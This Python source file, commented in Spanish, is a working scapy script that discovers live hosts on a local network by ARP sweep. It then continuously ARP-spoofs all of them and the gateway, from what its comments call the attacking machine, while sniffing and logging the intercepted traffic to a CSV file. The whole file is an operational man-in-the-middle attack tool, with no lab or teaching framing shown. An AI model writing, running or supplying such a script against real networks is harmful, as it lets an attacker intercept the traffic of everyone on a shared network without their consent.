from scapy.all import *
from collections import deque
import pandas as pd
import time
import threading
import os

class TrafficCollector:
    def __init__(self):
        self.data = deque(maxlen=10000)
        self.running = False
        self.output_file = "network_data.csv"
        self._init_file()
        self.gateway_ip = "192.168.1.1"  # Cambiar por la IP del gateway de la red
        self.local_ip = "192.168.1.100"  # Cambiar por la IP local de la máquina atacante
        self.interface = "Ethernet"  # Cambiar por la interfaz de red
        self.active_ips = []

    def _init_file(self):
        """Inicializa el archivo CSV de salida si no existe."""
        if not os.path.exists(self.output_file):
            columns = ['timestamp', 'src_ip', 'dst_ip', 'proto', 'sport', 'dport', 'length']
            pd.DataFrame(columns=columns).to_csv(self.output_file, index=False)

    def _packet_handler(self, pkt):
        """Procesa y almacena la información relevante de los paquetes."""
        try:
            if IP in pkt:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                proto = pkt[IP].proto
                sport = pkt.sport if hasattr(pkt, 'sport') else 0
                dport = pkt.dport if hasattr(pkt, 'dport') else 0
                
                self.data.append({
                    'timestamp': timestamp,
                    'src_ip': src_ip,
                    'dst_ip': dst_ip,
                    'proto': proto,
                    'sport': sport,
                    'dport': dport,
                    'length': len(pkt)
                })
        except Exception as e:
            pass

    def _save_data(self):
        """Guarda los datos capturados en el archivo CSV cada 10 segundos."""
        while self.running:
            time.sleep(10)
            if self.data:
                df = pd.DataFrame(self.data)
                df.to_csv(self.output_file, mode='a', header=False, index=False)
                self.data.clear()
                print(f"Guardados {len(df)} registros")

    def _discover_active_ips(self):
        """Descubre IPs activas en la red mediante ARP."""
        print(f"Descubriendo hosts activos en la red...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{self.gateway_ip}/24"), timeout=2, iface=self.interface, verbose=0)
        self.active_ips = [rcv[ARP].psrc for snd, rcv in ans if ARP in rcv]
        print(f"IPs activas detectadas: {self.active_ips}")

    def _arp_spoof(self, target_ip):
        """Realiza ARP Spoofing hacia una IP específica."""
        try:
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(self.gateway_ip)
            
            if not target_mac or not gateway_mac:
                print(f"[!] No se pudo obtener MAC para {target_ip} o gateway")
                return
            
            # Paquete para el target
            sendp(
                Ether(dst=target_mac)/ARP(
                    op=2, 
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip
                ),
                iface=self.interface,
                verbose=0
            )
            
            # Paquete para el gateway
            sendp(
                Ether(dst=gateway_mac)/ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip
                ),
                iface=self.interface,
                verbose=0
            )
            
        except Exception as e:
            print(f"[!] Error en ARP spoofing ({target_ip}): {str(e)}")

    def start(self, duration=300):
        """Inicia la recolección de datos y ARP Spoofing."""
        self.running = True
        saver = threading.Thread(target=self._save_data)
        saver.start()
        
        # Descubrir IPs activas en la red
        self._discover_active_ips()
        
        # Hilo para ARP spoofing
        def arp_loop():
            print("\n[+] Iniciando ARP spoofing...")
            while self.running:
                try:
                    for ip in self.active_ips:
                        if ip != self.local_ip:  # No hacer spoofing en la propia IP
                            self._arp_spoof(ip)
                    time.sleep(10)  # Realizar ARP Spoofing cada 10 segundos
                except Exception as e:
                    print(f"[!] Error en hilo ARP: {str(e)}")
        
        threading.Thread(target=arp_loop, daemon=True).start()
        
        # Sniffer principal
        print("\n[+] Iniciando monitor de tráfico...")
        try:
            sniff(prn=self._packet_handler, timeout=duration, store=0, iface=self.interface)
        except Exception as e:
            print(f"[!] Error en sniffer: {str(e)}")

        self.running = False
        saver.join()
        print("Captura completada")

if __name__ == "__main__":
    collector = TrafficCollector()
    collector.start()
